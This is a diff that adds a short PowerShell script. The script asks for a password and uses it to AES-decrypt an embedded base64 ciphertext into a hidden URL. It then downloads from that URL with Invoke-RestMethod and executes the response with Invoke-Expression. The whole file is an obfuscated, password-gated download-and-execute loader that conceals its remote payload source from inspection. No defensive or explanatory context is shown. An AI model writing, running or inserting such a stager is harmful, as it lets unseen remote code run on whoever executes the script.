@@ -1,0 +1,12 @@
+$iv=[Convert]::FromBase64String("7xskB956m0lx+xtdIcxRXg==")
+$ct=[Convert]::FromBase64String("FiDneh2ejwCYNlUa0SGos+N2aihXjFCDYkOTISv37SDU1Vu4RdC1sMqtxycmPRth/6k0+8KlA18vxWHQNYYoBIROYWp0NDu0/JG6CEGkeUd526+dZjaEax4/8/9cxNfochpstz0QiDeabFcwXXwWtw==")
+$p=Read-Host "Password"
+
+try{
+  $k=([Security.Cryptography.SHA256]::Create()).ComputeHash([Text.Encoding]::UTF8.GetBytes($p))
+  $a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$a.Mode='CBC';$a.Padding='PKCS7'
+  $plain=[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length))
+  Invoke-Expression (Invoke-RestMethod $plain)
+}catch{
+  Write-Host "ERROR: Wrong password or corrupted ciphertext."
+}
